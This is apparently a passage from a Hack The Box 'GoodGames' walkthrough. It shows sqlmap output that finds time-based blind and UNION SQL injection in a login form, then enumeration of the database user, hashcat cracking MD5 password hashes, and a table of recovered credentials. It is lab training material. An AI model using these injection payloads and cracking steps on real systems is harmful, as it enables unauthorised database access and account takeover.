[13:04:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:04:58] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:04:58] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:04:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:04:59] [INFO] testing 'Oracle AND time-based blind'
[13:04:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:05:00] [WARNING] (custom) POST parameter '#2*' does not seem to be injectable
[13:05:00] [INFO] testing if (custom) POST parameter '#3*' is dynamic
[13:05:00] [WARNING] (custom) POST parameter '#3*' does not appear to be dynamic
[13:05:00] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#3*' might not be injectable
[13:05:00] [INFO] testing for SQL injection on (custom) POST parameter '#3*'
[13:05:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:05:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:05:01] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:05:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:05:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:05:02] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:05:02] [INFO] testing 'Generic inline queries'
[13:05:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:05:02] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:05:03] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:05:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:05:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:05:04] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:05:04] [INFO] testing 'Oracle AND time-based blind'
[13:05:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:05:05] [WARNING] (custom) POST parameter '#3*' does not seem to be injectable
[13:05:05] [INFO] testing if (custom) POST parameter '#4*' is dynamic
[13:05:05] [WARNING] (custom) POST parameter '#4*' does not appear to be dynamic
[13:05:05] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#4*' might not be injectable
[13:05:05] [INFO] testing for SQL injection on (custom) POST parameter '#4*'
[13:05:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:05:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:05:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:05:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:05:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:05:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:05:07] [INFO] testing 'Generic inline queries'
[13:05:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:05:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:05:08] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:05:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:05:09] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:05:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:05:09] [INFO] testing 'Oracle AND time-based blind'
[13:05:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:05:10] [WARNING] (custom) POST parameter '#4*' does not seem to be injectable
[13:05:10] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect t
hat there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'


```

💉 **login** 💉

```
[ 12:23PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]                                                                                                                      
 $ sqlmap -u "http://goodgames.htb/login" --data "email=*&password=*"                                                                                                               
        ___                                                                                                                                                                         
       __H__                                                                                                                                                                        
 ___ ___[']_____ ___ ___  {1.6.12#stable}                                                                                                                                           
|_ -| . [.]     | .'| . |                                                                                                                                                           
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                                                                                        
                                                                                                                                                                                    
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and fed
eral laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                                   
                                                                                                                                                                                    
[*] starting @ 12:34:25 /2022-12-22/                                                                                                                                                
                                                                                                                                                                                    
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y                                                                                              
[12:34:28] [INFO] testing connection to the target URL                                                                                                                              
[12:34:29] [INFO] testing if the target URL content is stable                                                                                                                       
[12:34:29] [INFO] target URL content is stable                                                                                                                                      
[12:34:29] [INFO] testing if (custom) POST parameter '#1*' is dynamic                                                                                                               
[12:34:29] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic                                                                                                    
[12:34:30] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable                                                                        
[12:34:30] [INFO] testing for SQL injection on (custom) POST parameter '#1*'                                                                                                        
[12:34:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                                                        
[12:34:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                                                
[12:34:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                
[12:34:31] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                                                     
[12:34:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                               
[12:34:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                                               
[12:34:32] [INFO] testing 'Generic inline queries'                                                                                                                                  
[12:34:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                                                                              
[12:34:32] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                                                   
[12:34:33] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:34:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:34:43] [INFO] (custom) POST parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:34:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:34:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:34:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:34:58] [INFO] target URL appears to have 4 columns in query
got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] n
[12:35:05] [INFO] (custom) POST parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[12:35:11] [INFO] testing if (custom) POST parameter '#2*' is dynamic
[12:35:11] [WARNING] (custom) POST parameter '#2*' does not appear to be dynamic
[12:35:11] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#2*' might not be injectable
[12:35:11] [INFO] testing for SQL injection on (custom) POST parameter '#2*'
[12:35:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:35:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:35:12] [INFO] testing 'Generic inline queries'
[12:35:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:35:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:35:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:35:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:35:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:35:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:35:13] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:35:14] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:35:14] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:35:14] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:35:15] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[12:35:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:35:25] [WARNING] (custom) POST parameter '#2*' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 173 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=' AND (SELECT 1612 FROM (SELECT(SLEEP(5)))OMJn) AND 'asXf'='asXf&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: email=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716b7871,0x6556565a707445516e4f50797659665a524c546b464a4b48756462794871444b7955445079645357,0x7178716a71)-- -&password=
---
[12:35:25] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[12:35:25] [INFO] fetched data logged to text files under '/home/ops/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 12:35:25 /2022-12-22/
```

Checking who we are running as and if we are a DBA
```
[ 12:36PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]
 $ sqlmap -u "http://goodgames.htb/login" --data "email=*&password=*" --current-user --is-dba   
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:45:19 /2022-12-22/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[12:45:21] [INFO] resuming back-end DBMS 'mysql' 
[12:45:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=' AND (SELECT 1612 FROM (SELECT(SLEEP(5)))OMJn) AND 'asXf'='asXf&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: email=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716b7871,0x6556565a707445516e4f50797659665a524c546b464a4b48756462794871444b7955445079645357,0x7178716a71)-- -&password=
---
[12:45:22] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[12:45:22] [INFO] fetching current user
got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] n
current user: 'main_admin@localhost'
[12:45:27] [INFO] testing if current user is DBA
[12:45:27] [INFO] fetching current user
[12:45:27] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
current user is DBA: False
[12:45:27] [INFO] fetched data logged to text files under '/home/ops/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 12:45:27 /2022-12-22/

```

Checking user privileges; and if we can obtain users and passwords
```
[ 12:46PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]                                                                                                                       
 $ sqlmap -u "http://goodgames.htb/login" --data "email=*&password=*" --privileges --users --passwords                                                                               
        ___                                                                                                                                                                          
       __H__                                                                                                                                                                         
 ___ ___[']_____ ___ ___  {1.6.12#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:49:56 /2022-12-22/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[12:49:58] [INFO] resuming back-end DBMS 'mysql' 
[12:49:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=' AND (SELECT 1612 FROM (SELECT(SLEEP(5)))OMJn) AND 'asXf'='asXf&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: email=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716b7871,0x6556565a707445516e4f50797659665a524c546b464a4b48756462794871444b7955445079645357,0x7178716a71)-- -&passwor
d=
---
[12:49:59] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[12:49:59] [INFO] fetching database users
got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] n
database management system users [1]:
[*] 'main_admin'@'localhost'

[12:50:01] [INFO] fetching database users password hashes
[12:50:02] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[12:50:03] [WARNING] the SQL query provided does not return any output
[12:50:03] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[12:50:03] [WARNING] the SQL query provided does not return any output
[12:50:03] [INFO] fetching database users
[12:50:03] [INFO] fetching number of password hashes for user 'main_admin'
[12:50:03] [WARNING] time-based comparison requires larger statistical model, please wait.................. (done)                                                                  
[12:50:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[12:50:04] [INFO] retrieved: 
[12:50:05] [WARNING] unable to retrieve the number of password hashes for user 'main_admin'
[12:50:05] [ERROR] unable to retrieve the password hashes for the database users
[12:50:05] [INFO] fetching database users privileges
database management system users privileges:
[*] 'main_admin'@'localhost' [1]:
    privilege: USAGE

[12:50:05] [INFO] fetched data logged to text files under '/home/ops/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 12:50:05 /2022-12-22/

```

### Hash Cracking

```
PS D:\hashcat-6.2.6> .\hashcat -m 0 .\input\goodgames.htb.txt '.\dictionaries\*' -r ..\hashcat\rules\* -o cracked-md5-goodgames-rockyou-all_rules -O -w3 --status
hashcat (v6.2.6-129-g18fcf28d6) starting

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
CUDA API (CUDA 12.0)
====================
* Device #1: NVIDIA GeForce GTX 1070, 7231/8191 MB, 15MCU

OpenCL API (OpenCL 3.0 CUDA 12.0.70) - Platform #1 [NVIDIA Corporation]
=======================================================================
* Device #2: NVIDIA GeForce GTX 1070, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1473 MB

Dictionary cache hit:
* Filename..: .\dictionaries\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 1104517568

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: .\input\goodgames.htb.txt
Time.Started.....: Thu Dec 22 13:21:36 2022 (1 sec)
Time.Estimated...: Thu Dec 22 13:21:37 2022 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (.\dictionaries\rockyou.txt)
Guess.Mod........: Rules (..\hashcat\rules\best64.rule)
Guess.Queue......: 1/95 (1.05%)
Speed.#1.........:  1082.1 MH/s (62.14ms) @ Accel:512 Loops:77 Thr:512 Vec:1
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
Progress.........: 605677919/1104517568 (54.84%)
Rejected.........: 125279/605677919 (0.02%)
Restore.Point....: 3933082/14344384 (27.42%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: se7ven1985 -> gllabe
Hardware.Mon.#1..: Temp: 35c Fan: 27% Util: 43% Core:1759MHz Mem:3802MHz Bus:16
Started: Thu Dec 22 13:21:27 2022
Stopped: Thu Dec 22 13:21:38 2022
PS D:\hashcat-6.2.6>
```

**Cracked Hashes**
Important - the 'Register' user was created when performing tests and is not initial DB account
```
Database: main
Table: user
[2 entries]
+----+----------+---------------------+----------------------------------+--------------------+
| id | name     | email               | password                         | password           |
+----+----------+---------------------+----------------------------------+--------------------+
| 1  | admin    | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec | superadministrator |
| 2  | Register | register@form.com   | 2c103f2c4ed1e59c0b4e2e01821770fa | Password123!       |
+----+----------+---------------------+----------------------------------+--------------------+
```

